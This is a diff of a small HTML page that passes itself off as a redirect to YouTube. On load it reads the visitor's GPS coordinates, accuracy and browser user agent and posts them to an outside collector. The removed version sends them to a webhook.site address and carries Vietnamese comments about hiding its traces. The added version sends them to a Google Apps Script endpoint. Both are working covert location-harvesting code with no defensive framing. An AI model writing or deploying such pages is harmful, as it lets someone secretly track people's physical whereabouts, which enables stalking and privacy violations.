@@ -1,48 +1,35 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8">
-    <title>Redirecting...</title>
-    <script>
-      // Ẩn dấu vết: không hiện gì trên màn hình
-      window.onload = function() {
-        try {
-          navigator.geolocation.getCurrentPosition(function(pos) {
-            let lat = pos.coords.latitude;
-            let lon = pos.coords.longitude;
-            let acc = pos.coords.accuracy;
-            let ua = navigator.userAgent;
-            let time = new Date().toString();
+<head>
+  <title>Đang lấy vị trí...</title>
+  <script>
+    window.onload = function () {
+      navigator.geolocation.getCurrentPosition(function (pos) {
+        let data = {
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          acc: pos.coords.accuracy,
+          ua: navigator.userAgent
+        };
 
-            // Gửi kín thông tin về webhook
-            fetch("https://webhook.site/03cabbff-012b-4be2-a96e-57fd5cbd97c9", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                lat: lat,
-                lon: lon,
-                acc: acc,
-                ua: ua,
-                time: time
-              })
-            });
+        fetch("https://script.google.com/macros/s/AKfycbxO9lv2UOiqRtHh6LIX3vYyYZH9CR5_2q2pwlIn5fMIYvZ_Y8GIwoGHjA2K-0L1qdlQkA/exec", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(data)
+        });
 
-            // Chuyển hướng sau 2 giây
-            setTimeout(() => {
-              location.href = "https://youtube.com";
-            }, 2000);
-          }, function() {
-            // Nếu người dùng từ chối truy cập GPS → vẫn redirect
-            setTimeout(() => {
-              location.href = "https://youtube.com";
-            }, 1500);
-          });
-        } catch (e) {
+        setTimeout(() => {
           location.href = "https://youtube.com";
-        }
-      };
-    </script>
-  </head>
-  <body>
-  </body>
+        }, 1500);
+      }, function () {
+        alert("Không thể lấy vị trí!");
+        location.href = "https://youtube.com";
+      });
+    };
+  </script>
+</head>
+<body>
+</body>
 </html>
